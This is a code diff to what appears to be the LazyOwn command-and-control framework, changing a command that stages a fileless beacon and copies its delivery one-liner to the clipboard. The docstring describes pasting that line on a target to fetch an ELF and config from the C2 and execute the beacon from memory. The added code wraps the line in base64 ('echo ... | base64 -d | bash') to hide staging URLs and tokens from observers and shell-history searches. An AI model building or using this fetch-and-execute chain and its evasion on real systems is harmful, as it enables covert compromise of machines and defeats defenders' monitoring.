@@ -623,7 +623,7 @@ class BofMarketplaceCommandSet(LazyOwnCommandSet):
     def do_bsb_stage(self, line: str):
         """Stage the fileless BlackSandBeacon and print its delivery one-liner.
 
-        Usage: bsb_stage
+        Usage: bsb_stage [raw]
 
         Aligns the staged beacon runtime config with the LazyOwn C2
         (poll/report URIs, master key from sessions/key.aes), generates a
@@ -631,6 +631,11 @@ class BofMarketplaceCommandSet(LazyOwnCommandSet):
         fileless one-liner to the clipboard:
 
             upstream /stage/ stager || raw /s/ memfd stager || disk curl
+
+        By default the one-liner is wrapped in base64 obfuscation
+        (``echo <b64> | base64 -d | bash``) so the pasted command hides
+        the staging URLs and token from shoulder-surfing and basic
+        shell-history greps. Pass ``raw`` to get the plain chain.
 
         Paste it on the target: it fetches the ELF + config over HTTPS,
         memfd_creates both and execve's the beacon from anonymous memory
@@ -646,10 +651,18 @@ class BofMarketplaceCommandSet(LazyOwnCommandSet):
         if not oneliner:
             print_error("no delivery fallback could be built")
             return
+        import base64
+
+        if line.strip() != "raw":
+            encoded = base64.b64encode(oneliner.encode("utf-8")).decode("ascii")
+            oneliner = f"echo '{encoded}' | base64 -d | bash"
         from utils import copy2clip
 
         copy2clip(oneliner)
-        print_succ(f"{GREEN}fileless one-liner ready (upstream stage || raw /s/ || disk fallback){RESET}")
+        if line.strip() != "raw":
+            print_succ(f"{GREEN}obfuscated fileless one-liner ready (base64 || upstream stage || raw /s/ || disk){RESET}")
+        else:
+            print_succ(f"{GREEN}raw fileless one-liner ready (upstream stage || raw /s/ || disk fallback){RESET}")
         print_msg("queue commands with issue_command_to_c2; run BOFs with bof_run <name> <beacon_id>")
 
 
